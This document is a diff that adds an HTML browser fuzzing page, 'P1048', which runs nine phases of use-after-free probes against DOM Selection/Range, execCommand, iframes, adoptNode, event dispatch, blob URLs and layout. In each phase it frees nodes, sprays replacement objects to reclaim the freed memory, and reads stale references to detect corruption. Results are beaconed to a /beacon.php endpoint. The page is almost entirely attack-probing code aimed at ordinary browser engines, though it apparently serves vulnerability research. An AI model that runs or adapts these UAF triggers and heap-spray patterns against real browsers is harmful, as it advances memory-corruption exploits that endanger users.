@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P1048</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.pass{color:#22c55e}.fail{color:#ef4444}.warn{color:#f59e0b}.info{color:#38bdf8}
+h2{color:#7dd3fc;margin:8px 0 4px;font-size:13px}
+</style></head><body><div id="hud"><b class="info">P1048: Deep Lifecycle UAF Battery</b><br>
+<span class="warn">Targeting DOM reentrancy, Selection/Range UAF, execCommand, iframe lifecycle...</span><div id="log"></div></div>
+<div id="arena" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden"></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1048-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+function lg(s,c){var d=document.getElementById('log');if(d){d.innerHTML+='<div class="'+(c||'info')+'">'+s+'</div>';d.scrollTop=d.scrollHeight;}}
+
+var arena=document.getElementById('arena');
+var anomalies=[];
+
+bn('BOOT','ts='+Date.now().toString(36));
+lg('P1048 booted - deep lifecycle UAF patterns');
+
+// ======================================================================
+// PHASE A: Selection + Range manipulation during DOM mutation
+// Setting selection into a subtree, then destroying that subtree during
+// a selection-related event callback. The Selection object may hold stale
+// Range endpoints into freed DOM nodes.
+// ======================================================================
+setTimeout(function phaseA(){
+  lg('<h2>[A] Selection/Range UAF during DOM mutation</h2>');
+  var res = {rounds:0, errors:0, hits:0};
+
+  try {
+    for(var round=0; round<80; round++){
+      var container = document.createElement('div');
+      container.contentEditable = 'true';
+      arena.appendChild(container);
+      container.innerHTML = '<p id="sel-p-'+round+'">Line one <b>bold <i>italic</i> text</b> end</p><p>Second paragraph with <a href="#">link</a></p>';
+
+      // Set selection into the contentEditable
+      var sel = window.getSelection();
+      var boldNode = container.querySelector('b');
+      var italicNode = container.querySelector('i');
+
+      if(boldNode && italicNode && boldNode.firstChild && italicNode.firstChild){
+        try {
+          var range = document.createRange();
+          range.setStart(boldNode.firstChild, 0);
+          range.setEnd(italicNode.firstChild, italicNode.firstChild.length);
+          sel.removeAllRanges();
+          sel.addRange(range);
+        } catch(e){}
+
+        // Now destroy the selected nodes via innerHTML
+        container.innerHTML = '<p>REPLACED</p>';
+
+        // Allocate replacement objects in freed memory
+        var spray = [];
+        for(var i=0; i<100; i++){
+          var d = document.createElement('span');
+          d.textContent = 'SPRAY_'+round+'_'+i;
+          d.setAttribute('data-x', 'AAAA'.repeat(20));
+          spray.push(d);
+        }
+
+        // Try to read from the stale range
+        try {
+          var rangeStr = range.toString();
+          if(rangeStr && rangeStr.indexOf('SPRAY') !== -1){
+            res.hits++;
+            anomalies.push('A-range-spray:'+rangeStr.slice(0,40));
+          }
+          if(rangeStr && rangeStr.indexOf('bold') === -1 && rangeStr.indexOf('italic') === -1 && rangeStr.indexOf('REPLACED') === -1 && rangeStr.length > 0){
+            res.hits++;
+            anomalies.push('A-range-stale:'+rangeStr.slice(0,40));
+          }
+        } catch(e){}
+
+        // Try to access selection after DOM destruction
+        try {
+          var selRange = sel.getRangeAt(0);
+          var sc = selRange.startContainer;
+          var so = selRange.startOffset;
+          if(sc && sc.textContent && sc.textContent.indexOf('SPRAY') !== -1){
+            res.hits++;
+            anomalies.push('A-sel-spray:'+sc.textContent.slice(0,40));
+          }
+        } catch(e){}
+
+        spray = null;
+      }
+
+      arena.removeChild(container);
+      res.rounds++;
+    }
+  } catch(e){ res.errors++; }
+
+  bn('A-SELRANGE', 'rounds='+res.rounds+'|errors='+res.errors+'|hits='+res.hits);
+  lg('[A] Selection/Range: rounds='+res.rounds+' hits='+res.hits, res.hits>0?'warn':'pass');
+  setTimeout(phaseB, 10);
+}, 50);
+
+// ======================================================================
+// PHASE B: document.execCommand reentrancy
+// execCommand internally modifies DOM, and callbacks (input events,
+// mutation observers) can fire mid-operation. Destroying nodes during
+// these callbacks can leave execCommand with dangling pointers.
+// ======================================================================
+function phaseB(){
+  lg('<h2>[B] execCommand Reentrancy UAF</h2>');
+  var res = {rounds:0, errors:0, hits:0};
+
+  try {
+    for(var round=0; round<60; round++){
+      var container = document.createElement('div');
+      container.contentEditable = 'true';
+      arena.appendChild(container);
+      container.innerHTML = '<p>Test line <b>bold part</b> and <i>italic part</i> end.</p>';
+      container.focus();
+
+      // Select the bold text
+      var sel = window.getSelection();
+      var bold = container.querySelector('b');
+      if(bold && bold.firstChild){
+        try {
+          var range = document.createRange();
+          range.selectNodeContents(bold);
+          sel.removeAllRanges();
+          sel.addRange(range);
+        } catch(e){}
+      }
+
+      // Set up mutation observer that destroys nodes mid-command
+      var destroyed = false;
+      var observer = new MutationObserver(function(records){
+        if(!destroyed){
+          destroyed = true;
+          // Destroy the container contents during the mutation
+          try {
+            while(container.firstChild) container.removeChild(container.firstChild);
+          } catch(e){}
+          // Spray replacement objects
+          for(var i=0; i<50; i++){
+            var s = document.createElement('div');
+            s.textContent = 'EXECSPRAY_'+i;
+            container.appendChild(s);
+          }
+        }
+      });
+      observer.observe(container, {childList:true, subtree:true, characterData:true});
+
+      // Execute commands that modify the DOM
+      try { document.execCommand('bold', false, null); } catch(e){}
+      try { document.execCommand('italic', false, null); } catch(e){}
+      try { document.execCommand('insertHTML', false, '<span class="injected">INJECTED</span>'); } catch(e){}
+      try { document.execCommand('formatBlock', false, 'h1'); } catch(e){}
+      try { document.execCommand('insertUnorderedList', false, null); } catch(e){}
+
+      observer.disconnect();
+
+      // Check if any unexpected data leaked through
+      var html = container.innerHTML;
+      if(html.indexOf('EXECSPRAY') === -1 && html.length > 0 && html.indexOf('INJECTED') === -1 && html.indexOf('Test') === -1){
+        res.hits++;
+        anomalies.push('B-exec-strange:'+html.slice(0,60));
+      }
+
+      arena.removeChild(container);
+      res.rounds++;
+    }
+  } catch(e){ res.errors++; }
+
+  bn('B-EXEC', 'rounds='+res.rounds+'|errors='+res.errors+'|hits='+res.hits);
+  lg('[B] execCommand: rounds='+res.rounds+' hits='+res.hits, res.hits>0?'warn':'pass');
+  setTimeout(phaseC, 10);
+}
+
+// ======================================================================
+// PHASE C: Iframe lifecycle + cross-frame DOM access
+// Create iframes, access their DOM, then destroy the iframe. The
+// references to the iframe's DOM nodes become dangling.
+// ======================================================================
+function phaseC(){
+  lg('<h2>[C] Iframe Lifecycle UAF</h2>');
+  var res = {rounds:0, errors:0, hits:0};
+  var idx = 0;
+
+  function nextRound(){
+    if(idx >= 40){
+      bn('C-IFRAME', 'rounds='+res.rounds+'|errors='+res.errors+'|hits='+res.hits);
+      lg('[C] Iframe lifecycle: rounds='+res.rounds+' hits='+res.hits, res.hits>0?'warn':'pass');
+      setTimeout(phaseD, 10);
+      return;
+    }
+
+    var iframe = document.createElement('iframe');
+    iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+    arena.appendChild(iframe);
+
+    var loaded = false;
+    iframe.onload = function(){
+      if(loaded) return;
+      loaded = true;
+
+      try {
+        var iDoc = iframe.contentDocument;
+        var iWin = iframe.contentWindow;
+
+        // Build DOM inside iframe
+        iDoc.body.innerHTML = '<div id="target"><span>iframe-content-'+idx+'</span></div>';
+        var target = iDoc.getElementById('target');
+        var span = iDoc.querySelector('span');
+        var text = span ? span.firstChild : null;
+
+        // Create Range in iframe's document
+        var iRange = iDoc.createRange();
+        if(span && span.firstChild){
+          iRange.selectNodeContents(span);
+        }
+
+        // Create TreeWalker in iframe's document
+        var iWalker = iDoc.createTreeWalker(iDoc.body, NodeFilter.SHOW_ALL);
+        iWalker.nextNode();
+        iWalker.nextNode();
+
+        // Store references
+        var refs = {doc: iDoc, win: iWin, target: target, span: span, text: text, range: iRange, walker: iWalker};
+
+        // Destroy the iframe
+        arena.removeChild(iframe);
+
+        // Spray allocations
+        var spray = [];
+        for(var i=0; i<80; i++){
+          spray.push(document.createElement('div'));
+          spray[spray.length-1].innerHTML = '<b>IFSPRAY_'+idx+'_'+i+'</b>';
+        }
+
+        // Try to access stale references
+        try {
+          var rStr = refs.range.toString();
+          if(rStr && rStr.indexOf('IFSPRAY') !== -1){
+            res.hits++;
+            anomalies.push('C-range-spray:'+rStr.slice(0,40));
+          }
+        } catch(e){}
+
+        try {
+          var wNode = refs.walker.nextNode();
+          if(wNode && wNode.textContent && wNode.textContent.indexOf('IFSPRAY') !== -1){
+            res.hits++;
+            anomalies.push('C-walker-spray:'+wNode.textContent.slice(0,40));
+          }
+        } catch(e){}
+
+        try {
+          if(refs.target && refs.target.textContent && refs.target.textContent.indexOf('IFSPRAY') !== -1){
+            res.hits++;
+            anomalies.push('C-target-spray:'+refs.target.textContent.slice(0,40));
+          }
+        } catch(e){}
+
+        spray = null;
+      } catch(e){ res.errors++; }
+
+      res.rounds++;
+      idx++;
+      setTimeout(nextRound, 5);
+    };
+
+    // Give iframe a blank doc
+    try {
+      var iDoc = iframe.contentDocument;
+      if(iDoc){
+        iDoc.open();
+        iDoc.write('<!DOCTYPE html><html><body></body></html>');
+        iDoc.close();
+      }
+    } catch(e){
+      // Fallback — just wait for load
+    }
+
+    // Timeout fallback
+    setTimeout(function(){
+      if(!loaded){
+        loaded = true;
+        try { arena.removeChild(iframe); } catch(e){}
+        res.rounds++;
+        idx++;
+        nextRound();
+      }
+    }, 500);
+  }
+
+  nextRound();
+}
+
+// ======================================================================
+// PHASE D: CSS animation + layout reentrancy
+// Trigger layout/paint during CSS transitions, then modify DOM inside
+// requestAnimationFrame or animation event callbacks.
+// ======================================================================
+function phaseD(){
+  lg('<h2>[D] CSS Animation + Layout Reentrancy</h2>');
+  var res = {rounds:0, errors:0, hits:0};
+  var roundsDone = 0;
+  var maxRounds = 30;
+
+  function doRound(){
+    if(roundsDone >= maxRounds){
+      bn('D-CSSANIM', 'rounds='+res.rounds+'|errors='+res.errors+'|hits='+res.hits);
+      lg('[D] CSS animation: rounds='+res.rounds+' hits='+res.hits, res.hits>0?'warn':'pass');
+      setTimeout(phaseE, 10);
+      return;
+    }
+
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;width:100px;height:100px;transition:all 0.01s;';
+    arena.appendChild(container);
+
+    // Build complex layout tree
+    container.innerHTML = '<div style="display:flex;flex-wrap:wrap">' +
+      '<div style="flex:1;min-width:50px"><span>A</span><b>B</b></div>'.repeat(20) +
+      '</div>';
+
+    // Force layout
+    void container.offsetHeight;
+
+    // Trigger transition + destroy during animation frame
+    container.style.width = '200px';
+    container.style.height = '200px';
+
+    var destroyed = false;
+    var frames = 0;
+
+    function animLoop(){
+      frames++;
+      if(frames > 5 || destroyed) {
+        try { arena.removeChild(container); } catch(e){}
+        roundsDone++;
+        res.rounds++;
+        setTimeout(doRound, 5);
+        return;
+      }
+
+      if(frames === 2 && !destroyed){
+        destroyed = true;
+        // Destroy subtree during layout/animation
+        try {
+          var flexDiv = container.firstChild;
+          if(flexDiv){
+            // Remove children rapidly
+            while(flexDiv.firstChild) flexDiv.removeChild(flexDiv.firstChild);
+            // Replace with different layout
+            flexDiv.innerHTML = '<table><tr><td>REPLACED</td></tr></table>';
+            // Force synchronous layout
+            void flexDiv.offsetHeight;
+            void container.getBoundingClientRect();
+          }
+        } catch(e){}
+      }
+
+      requestAnimationFrame(animLoop);
+    }
+    requestAnimationFrame(animLoop);
+  }
+
+  doRound();
+}
+
+// ======================================================================
+// PHASE E: Promise microtask timing with DOM mutations
+// Microtasks (Promise.then) run between tasks but DOM mutations may not
+// be fully committed. Accessing partially-committed DOM in microtasks
+// can expose inconsistent state.
+// ======================================================================
+function phaseE(){
+  lg('<h2>[E] Microtask Timing + DOM Mutation</h2>');
+  var res = {rounds:0, errors:0, hits:0};
+  var roundIdx = 0;
+  var maxRounds = 50;
+
+  function doRound(){
+    if(roundIdx >= maxRounds){
+      bn('E-MICRO', 'rounds='+res.rounds+'|errors='+res.errors+'|hits='+res.hits);
+      lg('[E] Microtask timing: rounds='+res.rounds+' hits='+res.hits, res.hits>0?'warn':'pass');
+      setTimeout(phaseF, 10);
+      return;
+    }
+
+    var container = document.createElement('div');
+    arena.appendChild(container);
+    container.innerHTML = '<div class="outer"><span class="inner">TEXT_'+roundIdx+'</span></div>';
+
+    var outerDiv = container.querySelector('.outer');
+    var innerSpan = container.querySelector('.inner');
+
+    // Start a DOM mutation
+    var observer = new MutationObserver(function(records){
+      // During the mutation notification, schedule a microtask
+      Promise.resolve().then(function(){
+        // This microtask runs after the mutation was notified but
+        // potentially before cleanup. Try to access removed nodes.
+        try {
+          if(innerSpan && innerSpan.parentNode === null){
+            // Node was removed — try to read from it
+            var text = innerSpan.textContent;
+            var sibling = innerSpan.nextSibling;
+            var attrs = innerSpan.attributes;
+
+            // Create objects in same size class as removed node
+            for(var i=0; i<20; i++){
+              var d = document.createElement('span');
+              d.textContent = 'MICRO_'+roundIdx+'_'+i;
+              d.className = 'micro-spray';
+            }
+
+            // Re-read the removed node
+            var text2 = innerSpan.textContent;
+            if(text2 !== text && text2.indexOf('MICRO') !== -1){
+              res.hits++;
+              anomalies.push('E-micro-uaf:'+text2.slice(0,40));
+            }
+          }
+        } catch(e){}
+      });
+    });
+    observer.observe(container, {childList:true, subtree:true});
+
+    // Remove the inner span (triggers mutation observer)
+    if(outerDiv && innerSpan){
+      outerDiv.removeChild(innerSpan);
+    }
+
+    // Wait for microtasks to complete
+    Promise.resolve().then(function(){
+      Promise.resolve().then(function(){
+        observer.disconnect();
+        try { arena.removeChild(container); } catch(e){}
+        res.rounds++;
+        roundIdx++;
+        setTimeout(doRound, 2);
+      });
+    });
+  }
+
+  doRound();
+}
+
+// ======================================================================
+// PHASE F: Blob URL rapid lifecycle + concurrent access
+// Create/revoke blob URLs extremely fast while concurrent img elements
+// try to load them. The URL table cleanup may race with the decoder.
+// ======================================================================
+function phaseF(){
+  lg('<h2>[F] Blob URL Lifecycle Race</h2>');
+  var res = {races:0, errors:0, hits:0, loadedAfterRevoke:0};
+  var raceIdx = 0;
+  var maxRaces = 100;
+
+  function doRace(){
+    if(raceIdx >= maxRaces){
+      bn('F-BLOBRACE', 'races='+res.races+'|errors='+res.errors+'|hits='+res.hits+'|loadAfterRevoke='+res.loadedAfterRevoke);
+      lg('[F] Blob URL race: races='+res.races+' loadAfterRevoke='+res.loadedAfterRevoke, res.loadedAfterRevoke>0?'warn':'pass');
+      setTimeout(phaseG, 10);
+      return;
+    }
+
+    // Create a valid 4x4 PNG blob
+    var pngData = new Uint8Array([
+      0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,
+      0x00,0x00,0x00,0x0D,0x49,0x48,0x44,0x52,
+      0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x04,
+      0x08,0x02,0x00,0x00,0x00,0x26,0x93,0x09,0x29,
+      0x00,0x00,0x00,0x1B,0x49,0x44,0x41,0x54,
+      0x78,0x01,0x62,0xF8,0x0F,0x00,0x01,0x01,0x00,0x05,
+      0x18,0xD8,0x4D,0x00,0x00,0x00,0x00,0x49,
+      0x45,0x4E,0x44,0xAE,0x42,0x60,0x82
+    ]);
+    var blob = new Blob([pngData], {type:'image/png'});
+
+    // Create multiple img elements pointing to same blob URL
+    var url = URL.createObjectURL(blob);
+    var imgs = [];
+    for(var i=0; i<5; i++){
+      var img = new Image();
+      img.src = url;
+      imgs.push(img);
+    }
+
+    // Immediately revoke while images are loading
+    URL.revokeObjectURL(url);
+
+    // Check if any image loaded AFTER revoke
+    var checked = 0;
+    function checkImg(img, imgIdx){
+      img.onload = function(){
+        res.loadedAfterRevoke++;
+        checked++;
+        if(checked >= 5) finishRace();
+      };
+      img.onerror = function(){
+        checked++;
+        if(checked >= 5) finishRace();
+      };
+    }
+    for(var i=0; i<imgs.length; i++) checkImg(imgs[i], i);
+
+    // Also try to create a NEW blob URL that might reuse the old slot
+    var blob2 = new Blob([pngData], {type:'image/png'});
+    var url2 = URL.createObjectURL(blob2);
+    var img2 = new Image();
+    img2.onload = function(){
+      // This image should load from url2, but if URL table races,
+      // it might get confused
+      try {
+        var c = document.createElement('canvas');
+        c.width = 4; c.height = 4;
+        var ctx = c.getContext('2d');
+        ctx.drawImage(img2, 0, 0);
+      } catch(e){}
+    };
+    img2.src = url2;
+
+    function finishRace(){
+      URL.revokeObjectURL(url2);
+      imgs = null;
+      res.races++;
+      raceIdx++;
+      setTimeout(doRace, 2);
+    }
+
+    // Timeout fallback
+    setTimeout(function(){
+      if(checked < 5){
+        checked = 999;
+        finishRace();
+      }
+    }, 300);
+  }
+
+  doRace();
+}
+
+// ======================================================================
+// PHASE G: document.adoptNode + importNode cross-document UAF
+// Move nodes between documents while they have active references.
+// The adoption process should update all references, but edge cases
+// with Ranges, Selections, and MutationObservers may be missed.
+// ======================================================================
+function phaseG(){
+  lg('<h2>[G] adoptNode/importNode Cross-Document UAF</h2>');
+  var res = {rounds:0, errors:0, hits:0};
+
+  try {
+    for(var round=0; round<50; round++){
+      // Create a second document
+      var impl = document.implementation;
+      var doc2 = impl.createHTMLDocument('test-'+round);
+      doc2.body.innerHTML = '<div id="source"><span>SOURCE_'+round+'</span><b>bold</b></div>';
+
+      var sourceDiv = doc2.getElementById('source');
+      var sourceSpan = doc2.querySelector('span');
+
+      // Create Range in doc2
+      var range2 = doc2.createRange();
+      if(sourceSpan && sourceSpan.firstChild){
+        range2.selectNodeContents(sourceSpan);
+      }
+
+      // Create MutationObserver in doc2
+      var mutHit = false;
+      var obs2 = new MutationObserver(function(records){
+        mutHit = true;
+      });
+      obs2.observe(doc2.body, {childList:true, subtree:true});
+
+      // Adopt the node into our document — this should move it
+      var adopted = document.adoptNode(sourceDiv);
+
+      // The range was in doc2 but its node is now in our document
+      try {
+        var rStr = range2.toString();
+        // Check if range still works or points to garbage
+        if(rStr && rStr.indexOf('SOURCE') === -1 && rStr.length > 0){
+          res.hits++;
+          anomalies.push('G-adopt-range:'+rStr.slice(0,40));
+        }
+      } catch(e){}
+
+      // Import (clone) back into doc2
+      try {
+        var imported = doc2.importNode(adopted, true);
+        doc2.body.appendChild(imported);
+      } catch(e){}
+
+      // Now destroy doc2 while range2 still exists
+      doc2 = null;
+
+      // Try to use range2 after doc2 is gone
+      try {
+        var rStr2 = range2.toString();
+        range2.collapse(true);
+      } catch(e){}
+
+      obs2.disconnect();
+      res.rounds++;
+    }
+  } catch(e){ res.errors++; }
+
+  bn('G-ADOPT', 'rounds='+res.rounds+'|errors='+res.errors+'|hits='+res.hits);
+  lg('[G] adoptNode: rounds='+res.rounds+' hits='+res.hits, res.hits>0?'warn':'pass');
+  setTimeout(phaseH, 10);
+}
+
+// ======================================================================
+// PHASE H: Rapid table/form layout stress
+// Table layout is one of the most complex layout code paths. Rapidly
+// modifying table structure during layout can expose bugs.
+// ======================================================================
+function phaseH(){
+  lg('<h2>[H] Table/Form Layout Stress</h2>');
+  var res = {rounds:0, errors:0, hits:0};
+
+  try {
+    for(var round=0; round<40; round++){
+      var container = document.createElement('div');
+      container.style.cssText = 'position:absolute;left:-9999px;width:200px';
+      arena.appendChild(container);
+
+      // Build complex table
+      var html = '<table border="1" style="table-layout:fixed;width:100%"><colgroup>';
+      for(var c=0; c<10; c++) html += '<col style="width:'+(5+c*2)+'%">';
+      html += '</colgroup>';
+      for(var r=0; r<10; r++){
+        html += '<tr>';
+        for(var c=0; c<10; c++){
+          var cs = (r === 3 && c === 2) ? ' colspan="3"' : '';
+          var rs = (r === 5 && c === 7) ? ' rowspan="2"' : '';
+          html += '<td'+cs+rs+' style="padding:1px">R'+r+'C'+c+'</td>';
+        }
+        html += '</tr>';
+      }
+      html += '</table>';
+      container.innerHTML = html;
+
+      // Force layout
+      void container.offsetHeight;
+
+      // Rapidly modify table structure
+      var table = container.querySelector('table');
+      if(table){
+        // Delete rows during layout recalc
+        try {
+          table.deleteRow(3);
+          void container.offsetHeight; // Force layout
+          table.deleteRow(5);
+          void container.offsetHeight;
+
+          // Insert new rows with different colspan pattern
+          var newRow = table.insertRow(2);
+          for(var c=0; c<5; c++){
+            var cell = newRow.insertCell(-1);
+            cell.colSpan = 2;
+            cell.textContent = 'NEW_'+c;
+          }
+          void container.offsetHeight;
+
+          // Read layout info after mutations
+          var cells = table.querySelectorAll('td');
+          for(var i=0; i<cells.length; i++){
+            var rect = cells[i].getBoundingClientRect();
+            // Check for anomalous layout values
+            if(rect.width < 0 || rect.height < 0 || rect.width > 10000 || rect.height > 10000){
+              res.hits++;
+              anomalies.push('H-layout:'+cells[i].textContent+':w='+rect.width+',h='+rect.height);
+            }
+          }
+        } catch(e){}
+      }
+
+      arena.removeChild(container);
+      res.rounds++;
+    }
+  } catch(e){ res.errors++; }
+
+  bn('H-TABLE', 'rounds='+res.rounds+'|errors='+res.errors+'|hits='+res.hits);
+  lg('[H] Table layout: rounds='+res.rounds+' hits='+res.hits, res.hits>0?'warn':'pass');
+  setTimeout(phaseI, 10);
+}
+
+// ======================================================================
+// PHASE I: Event dispatch reentrancy + target retargeting
+// Dispatch events where handlers modify the DOM tree, causing the event
+// to bubble through freed/replaced nodes.
+// ======================================================================
+function phaseI(){
+  lg('<h2>[I] Event Dispatch Reentrancy</h2>');
+  var res = {rounds:0, errors:0, hits:0};
+
+  try {
+    for(var round=0; round<50; round++){
+      var container = document.createElement('div');
+      arena.appendChild(container);
+      container.innerHTML = '<div class="outer"><div class="middle"><div class="inner">TARGET</div></div></div>';
+
+      var outer = container.querySelector('.outer');
+      var middle = container.querySelector('.middle');
+      var inner = container.querySelector('.inner');
+
+      var staleRef = null;
+
+      // Handler on middle: when event arrives, destroy inner
+      if(middle){
+        middle.addEventListener('click', function(e){
+          // Destroy the event target's subtree
+          if(e.target && e.target.parentNode){
+            var parent = e.target.parentNode;
+            try { parent.removeChild(e.target); } catch(e){}
+          }
+          // Spray
+          for(var i=0; i<30; i++){
+            var s = document.createElement('div');
+            s.textContent = 'EVTSPRAY_'+i;
+            container.appendChild(s);
+          }
+        }, false);
+      }
+
+      // Handler on outer: fires AFTER middle's handler destroyed the target
+      if(outer){
+        outer.addEventListener('click', function(e){
+          try {
+            // e.target should still be valid even if removed from DOM
+            var t = e.target;
+            if(t){
+              staleRef = t;
+              var tc = t.textContent;
+              if(tc && tc.indexOf('EVTSPRAY') !== -1){
+                res.hits++;
+                anomalies.push('I-evt-spray:'+tc.slice(0,40));
+              }
+            }
+          } catch(e){}
+        }, false);
+      }
+
+      // Dispatch click on inner
+      if(inner){
+        try {
+          var evt = document.createEvent('MouseEvents');
+          evt.initMouseEvent('click', true, true, window, 1, 0, 0, 0, 0, false, false, false, false, 0, null);
+          inner.dispatchEvent(evt);
+        } catch(e){}
+      }
+
+      arena.removeChild(container);
+      res.rounds++;
+    }
+  } catch(e){ res.errors++; }
+
+  bn('I-EVTDISP', 'rounds='+res.rounds+'|errors='+res.errors+'|hits='+res.hits);
+  lg('[I] Event dispatch: rounds='+res.rounds+' hits='+res.hits, res.hits>0?'warn':'pass');
+  setTimeout(phaseFinal, 10);
+}
+
+// ======================================================================
+// FINAL: Summary
+// ======================================================================
+function phaseFinal(){
+  var msg = 'anomalies='+anomalies.length;
+  if(anomalies.length > 0){
+    msg += '|details='+anomalies.join(';').slice(0,1500);
+  }
+  bn('DONE', msg);
+  lg('<h2>DONE</h2>'+
+    (anomalies.length > 0
+      ? '<span class="warn">ANOMALIES FOUND: '+anomalies.join(', ')+'</span>'
+      : '<span class="pass">All phases clean - no UAF detected</span>'),
+    anomalies.length > 0 ? 'warn' : 'pass');
+}
+</script></body></html>
